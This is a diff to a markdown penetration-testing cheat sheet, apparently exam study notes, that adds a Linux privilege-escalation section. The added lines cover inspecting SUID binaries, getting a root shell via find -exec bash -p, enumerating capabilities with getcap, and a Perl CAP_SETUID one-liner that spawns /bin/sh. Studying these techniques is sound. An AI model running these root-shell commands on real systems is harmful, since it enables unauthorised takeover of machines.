@@ -1407,8 +1407,23 @@ Reference
     Password: w00t
     id
     ```
-  - dd
 - abuse system linux components  
+  - abuse setuid binaries and capabilities  
+    - execute passwd change `passwd`  
+    - inspect passwd process `ps u -C passwd`  
+    - inspect passwd process pid `grep Uid /proc/1932/status`  
+    - reveal SUID flag `ls -asl /usr/bin/passwd` //-rwsr-xr-x 1 root root  
+    - set SUID `chmod u+s <file>`  
+    - abuse SUID and get a root shell `find /home/joe/Desktop -exec "/usr/bin/bash" -p \;` `whoami`  
+    - manual enumerate capabilities (privilege escalation) > /usr/bin/perl = cap_setuid+ep  
+      `/usr/sbin/getcap -r / 2>/dev/null`  
+    - check [GTFOBins](https://gtfobins.github.io/) for misued > search pearl 
+      ```
+      //if the binary has CAP_SETUID (Capabilities)
+      ./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+      ```
+  - abuse sudo
+  - exploit kernel vulnerababilities 
 
 ### 19. Port redirection and SSH tunneling
 ### 20. Tunneling through deep packet inspectation
